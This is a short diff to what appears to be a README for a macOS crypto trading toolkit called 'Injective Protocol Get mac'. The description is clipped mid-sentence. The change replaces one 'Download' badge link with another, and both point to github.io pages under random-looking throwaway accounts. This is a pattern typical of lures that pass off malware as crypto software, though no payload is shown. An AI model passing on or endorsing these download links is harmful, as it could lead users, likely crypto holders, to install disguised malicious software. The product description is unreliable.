@@ -2,7 +2,7 @@
 
 Injective Protocol Get mac on macOS — toolkit focused on orderbook/perps on injective, plus gas‑free execution (ecosystem) and cosmos ibc support with
 
-[![Download Injective Protocol Get mac](https://img.shields.io/badge/Download-Injective_Protocol_Get_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Injective Protocol Get mac](https://img.shields.io/badge/Download-Injective_Protocol_Get_mac-blueviolet)](https://harriettbenbenekwkpoxk.github.io/.github/Injective-Protocol)
 
 ---
 
